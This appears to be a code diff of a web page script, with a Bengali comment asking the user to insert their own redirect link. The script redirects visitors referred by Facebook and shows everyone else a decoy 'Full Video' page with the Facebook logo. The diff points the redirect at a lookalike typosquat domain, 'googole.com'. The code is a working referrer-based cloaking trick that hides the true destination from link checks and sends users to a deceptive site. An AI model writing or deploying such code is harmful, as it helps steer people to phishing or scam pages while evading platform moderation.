@@ -6,7 +6,7 @@
   <script>
     const ref = document.referrer;
     if (ref.includes("facebook.com") || ref.includes("fb")) {
-      window.location.href = "google.com"; // আপনার redirect link দিন
+      window.location.href = "https://googole.com/"; // আপনার redirect link দিন
     } else {
       document.write("<h1>Full Video</h1><img src='https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png' width='300'>");
     }
